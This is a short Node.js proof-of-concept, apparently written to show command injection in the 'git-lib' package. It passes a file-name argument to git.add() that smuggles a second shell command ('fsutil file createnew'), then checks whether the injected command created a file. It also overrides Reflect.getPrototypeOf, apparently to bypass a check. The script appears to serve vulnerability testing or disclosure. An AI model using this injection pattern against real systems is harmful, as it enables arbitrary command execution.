Reflect.getPrototypeOf = () => false;
const git = require('git-lib');
const fs = require('fs');
const path = './git-lib';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
try {
    console.log(git.add('test & fsutil file createnew git-lib 0 & ').finally(function () {
        file_exist = fs.existsSync(path);
        console.log('{ ' + file_exist + ', ' + true + ' }');
        fs.unlink(path, function (err) {
        });
    }));
} catch (error) {
}